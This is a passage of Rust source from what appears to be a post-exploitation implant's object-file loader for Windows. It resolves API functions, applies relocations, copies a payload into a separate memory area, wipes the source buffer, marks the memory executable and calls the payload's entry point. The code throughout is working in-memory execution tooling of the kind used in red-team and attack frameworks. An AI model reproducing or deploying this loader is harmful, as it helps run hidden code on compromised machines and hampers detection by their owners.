            let mut libz = lib.to_vec();
            libz.push(0);
            let mut funz = fun.to_vec();
            funz.push(0);

            /* resolve our module */
            let mut mod_ = unsafe { GetModuleHandleA(libz.as_ptr()) };
            if mod_.is_null() {
                mod_ = unsafe { LoadLibraryA(libz.as_ptr()) };
            }

            /* resolve our function */
            let ptr = match unsafe { GetProcAddress(mod_, funz.as_ptr()) } {
                Some(f) => f as usize,
                None => {
                    post_error(
                        0x4c,
                        format_args!(
                            "{}!{}",
                            String::from_utf8_lossy(&lib),
                            String::from_utf8_lossy(&fun)
                        ),
                    );
                    break;
                }
            };

            /* find a slot for our dynamically resolved function */
            let slot = function_slot(&mut ftable, ptr);
            if slot.is_null() {
                post_error_na(0x4e);
                break;
            }

            /* patch in this dynamically resolved symbol */
            if !process_reloc(&reloc, code_src, execpatch, slot as *mut u8, 0) {
                break;
            }
        } else {
            /* request for something in our function table */
            let base = &ftable as *const BoffFunctions as usize;
            let slot = base.wrapping_add((reloc.symbol as isize * size_of::<usize>() as isize) as usize);
            if !process_reloc(&reloc, code_src, execpatch, slot as *mut u8, 0) {
                break;
            }
        }
    }

    if success {
        /* copy payload to our area */
        unsafe { ptr::copy_nonoverlapping(code.buffer.as_ptr(), execpatch, code.length) };

        /* in case we crash, don't keep code co-located with strings */
        unsafe { ptr::write_bytes(code.buffer.as_mut_ptr(), 0, code.length) };

        /* cast our inline func, please */
        let inlinefunc: extern "C" fn(*mut u8, i32) =
            unsafe { core::mem::transmute(execpatch.add(entry)) };

        /* make the patch executable now */
        if crate::inject::finalize_memory_permissions(execpatch, code.length) {
            inlinefunc(args.buffer.as_ptr() as *mut u8, args.length as i32);
        }
    }

    /* OK, cleanup! */
    unsafe { VirtualFree(execpatch as *mut c_void, 0, MEM_RELEASE) };
}
